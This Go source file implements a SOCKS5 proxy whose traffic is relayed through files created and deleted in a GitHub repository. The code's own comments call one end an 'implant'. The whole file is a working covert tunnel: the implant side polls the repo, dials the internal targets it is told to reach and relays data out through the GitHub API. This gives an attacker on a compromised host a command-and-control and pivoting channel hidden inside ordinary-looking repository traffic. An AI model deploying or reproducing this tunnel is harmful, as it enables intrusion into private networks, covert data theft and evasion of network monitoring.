package socks5

import (
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strings"
	"time"

	"github.com/google/go-github/v66/github"
	"github.com/google/uuid"
)

const (
	connectTag = "CONNECT"
	// server -> implant -> target
	outTag = "OUT"
	// target -> implant -> server
	inTag = "IN"
)

type GithubSocks5 struct {
	client     *github.Client
	user       string
	repo       string
	serverAddr string
}

type GithubReaderWriter struct {
	client   *github.Client
	user     string
	repo     string
	uuid     string
	readTag  string
	writeTag string
}

func (g *GithubSocks5) StartServer() {
	listener, err := net.Listen("tcp", g.serverAddr)
	if err != nil {
		panic(err)
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			panic(err)
		}
		go g.handleConn(conn)
	}
}

func (g *GithubSocks5) handleConn(conn net.Conn) {
	err := g.socks5Auth(conn)
	if err != nil {
		fmt.Println("Failed to authenticate:", err)
		return
	}

	targetAddr, err := g.getTargetAddress(conn)
	if err != nil {
		fmt.Println("Failed to get target address:", err)
		return
	}

	fmt.Println("Target address:", targetAddr)
	githubRW, err := g.githubConnect(targetAddr)
	if err != nil {
		fmt.Println("Failed to connect to target:", err)
		return
	}
	fmt.Println("Connected to target using uuid:", githubRW.uuid)
	go func() {
		_, err := io.Copy(githubRW, conn)
		if err != nil {
			fmt.Println("Failed to copy from implant to target:", err)
		}
	}()
	_, err = io.Copy(conn, githubRW)
	if err != nil {
		fmt.Println("Failed to copy from target to implant:", err)
	}

}
func (g *GithubSocks5) StartClient() {
	for {
		target, githubRW, err := g.githubAccept()
		if err != nil {
			fmt.Println("Failed to accept connection:", err)
			continue
		}
		fmt.Println("Accepted connection with target:", target, "uuid:", githubRW.uuid)
		go g.handleAcceptedConn(target, githubRW)
	}
}
func (g *GithubSocks5) handleAcceptedConn(target string, githubRW *GithubReaderWriter) {
	conn, err := net.Dial("tcp", target)
	if err != nil {
		fmt.Println("Failed to connect to target:", err)
		return
	}
	fmt.Println("Connected to target:", target)
	go func() {
		_, err := io.Copy(githubRW, conn)
		if err != nil {
			fmt.Println("Failed to copy from target to implant:", err)
		}
	}()
	_, err = io.Copy(conn, githubRW)
	if err != nil {
		fmt.Println("Failed to copy from implant to target:", err)
	}
}

func (g *GithubSocks5) getTargetAddress(conn net.Conn) (string, error) {
	// Step 1: Read the request from the client
	buf := make([]byte, 263) // Maximum size of SOCKS5 request
	n, err := conn.Read(buf)
	if err != nil {
		return "", fmt.Errorf("failed to read request: %w", err)
	}

	// Step 2: Parse the request
	if n < 7 {
		return "", fmt.Errorf("invalid request length")
	}
	if buf[0] != 0x05 {
		return "", fmt.Errorf("unsupported SOCKS version: %d", buf[0])
	}
	if buf[1] != 0x01 {
		return "", fmt.Errorf("unsupported command: %d", buf[1])
	}

	// Step 3: Extract the target address
	var targetAddr string
	addrType := buf[3]
	switch addrType {
	case 0x01: // IPv4
		if n < 10 {
			return "", fmt.Errorf("invalid IPv4 address length")
		}
		targetAddr = net.IP(buf[4:8]).String()
	case 0x03: // Domain name
		domainLen := int(buf[4])
		if n < 5+domainLen+2 {
			return "", fmt.Errorf("invalid domain name length")
		}
		targetAddr = string(buf[5 : 5+domainLen])
	case 0x04: // IPv6
		if n < 22 {
			return "", fmt.Errorf("invalid IPv6 address length")
		}
		targetAddr = net.IP(buf[4:20]).String()
	default:
		return "", fmt.Errorf("unsupported address type: %d", addrType)
	}

	// Step 4: Extract the target port
	port := binary.BigEndian.Uint16(buf[n-2:])

	conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})

	return fmt.Sprintf("%s:%d", targetAddr, port), nil
}

func (g *GithubSocks5) socks5Auth(conn net.Conn) error {

	// Step 1: Read the handshake request from the client
	buf := make([]byte, 256)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("Failed to read handshake request:", err)
		return err
	}

	// Step 2: Parse the handshake request
	if n < 3 {
		fmt.Println("Invalid handshake request")
		return fmt.Errorf("invalid handshake request")
	}
	if buf[0] != 0x05 {
		fmt.Println("Unsupported SOCKS version:", buf[0])
		return fmt.Errorf("unsupported SOCKS version")
	}
	nMethods := int(buf[1])
	if n < 2+nMethods {
		fmt.Println("Invalid handshake request length")
		return fmt.Errorf("invalid handshake request length")
	}
	methods := buf[2 : 2+nMethods]

	// Step 3: Select authentication method (no authentication in this case)
	const noAuth = 0x00
	// methodSelected := noAuth
	methodSupported := false
	for _, method := range methods {
		if method == noAuth {
			methodSupported = true
			break
		}
	}
	if !methodSupported {
		fmt.Println("No supported authentication methods")
		return fmt.Errorf("no supported authentication methods")
	}

	// Step 4: Send handshake response
	_, err = conn.Write([]byte{0x05, noAuth})
	if err != nil {
		fmt.Println("Failed to send handshake response:", err)
		return err
	}

	// Handshake completed successfully
	fmt.Println("SOCKS5 handshake completed successfully")
	return nil
}

func (g *GithubSocks5) githubConnect(target string) (*GithubReaderWriter, error) {
	newConnTag := uuid.New().String()
	fileName := fmt.Sprintf("%s_%s", connectTag, newConnTag)
	// Create a new file in the repository
	_, _, err := g.client.Repositories.CreateFile(context.Background(), g.user, g.repo, "implant/"+fileName, &github.RepositoryContentFileOptions{
		Message: github.String(connectTag),
		Content: []byte(target),
	})
	if err != nil {
		return nil, fmt.Errorf("failed to create file: %w", err)
	}
	// Wait the file to be deleted
	for {
		_, _, _, err := g.client.Repositories.GetContents(context.Background(), g.user, g.repo, "implant/"+fileName, nil)
		if err != nil {
			break
		}
		time.Sleep(1 * time.Second)
	}
	return &GithubReaderWriter{
		client:   g.client,
		user:     g.user,
		repo:     g.repo,
		uuid:     newConnTag,
		readTag:  inTag,
		writeTag: outTag,
	}, nil
}

func (g *GithubSocks5) githubAccept() (string, *GithubReaderWriter, error) {
	// List the files in the repository
	for {

		_, files, _, err := g.client.Repositories.GetContents(context.Background(), g.user, g.repo, "implant", nil)
		if err != nil {
			if strings.Contains(err.Error(), "404 Not Found") {
				// The directory does not exist yet
				time.Sleep(1 * time.Second)
				continue
			}
			return "", nil, fmt.Errorf("failed to list files: %w", err)
		}
		// Find files starting with "CONNECT_"
		for _, file := range files {
			if file.GetType() == "file" && file.GetName()[:len(connectTag)] == connectTag {
				// Read the content of the file
				content, _, _, err := g.client.Repositories.GetContents(context.Background(), g.user, g.repo, "implant/"+file.GetName(), nil)
				if err != nil {
					return "", nil, fmt.Errorf("failed to read file: %w", err)
				}
				// Delete the file
				_, _, err = g.client.Repositories.DeleteFile(context.Background(), g.user, g.repo, "implant/"+file.GetName(), &github.RepositoryContentFileOptions{
					Message: github.String("Delete file"),
					SHA:     github.String(content.GetSHA()),
				})

				if err != nil {
					return "", nil, fmt.Errorf("failed to delete file: %w", err)
				}
				data, err := content.GetContent()
				uuid := file.GetName()[len(connectTag)+1:]
				if err != nil {
					return "", nil, fmt.Errorf("failed to get content: %w", err)
				}
				return data, &GithubReaderWriter{
					client:   g.client,
					user:     g.user,
					repo:     g.repo,
					uuid:     uuid,
					readTag:  outTag,
					writeTag: inTag,
				}, nil
			}
		}
		// Sleep for a while before checking again
		time.Sleep(1 * time.Second)
	}
}

func NewGithubSocks5(user string, repo string, token string, serverAddr string) *GithubSocks5 {
	client := github.NewClient(nil).WithAuthToken(token)
	return &GithubSocks5{
		user:       user,
		repo:       repo,
		client:     client,
		serverAddr: serverAddr,
	}
}

func (grw *GithubReaderWriter) Read(p []byte) (n int, err error) {
	fileName := fmt.Sprintf("%s_%s", grw.readTag, grw.uuid)
	fmt.Printf("Waiting for read file %s\n", fileName)
	for {
		content, _, _, err := grw.client.Repositories.GetContents(context.Background(), grw.user, grw.repo, "implant/"+fileName, nil)
		if err != nil {
			if strings.Contains(err.Error(), "404 Not Found") {
				// The file does not exist yet
				time.Sleep(1 * time.Second)
				continue
			}
			return 0, fmt.Errorf("failed to read file: %w", err)
		}
		data, err := content.GetContent()
		if err != nil {
			return 0, fmt.Errorf("failed to get content: %w", err)
		}
		copy(p, data)
		// Delete the file
		_, _, err = grw.client.Repositories.DeleteFile(context.Background(), grw.user, grw.repo, "implant/"+fileName, &github.RepositoryContentFileOptions{
			Message: github.String("Delete file"),
			SHA:     github.String(content.GetSHA()),
		})
		if err != nil {
			return 0, fmt.Errorf("failed to delete file: %w", err)
		}
		return len(data), nil
	}
}

func (grw *GithubReaderWriter) Write(p []byte) (n int, err error) {
	fileName := fmt.Sprintf("%s_%s", grw.writeTag, grw.uuid)
	fmt.Printf("Writing file %s\n", fileName)
	_, _, err = grw.client.Repositories.CreateFile(context.Background(), grw.user, grw.repo, "implant/"+fileName, &github.RepositoryContentFileOptions{
		Message: github.String(grw.writeTag),
		Content: p,
	})
	fmt.Printf("Write %s\n", p)
	if err != nil {
		return 0, fmt.Errorf("failed to create file: %w", err)
	}
	// Wait the file to be deleted
	for {
		_, _, _, err := grw.client.Repositories.GetContents(context.Background(), grw.user, grw.repo, "implant/"+fileName, nil)
		if err != nil {
			break
		}
		time.Sleep(1 * time.Second)
	}
	return len(p), nil
}
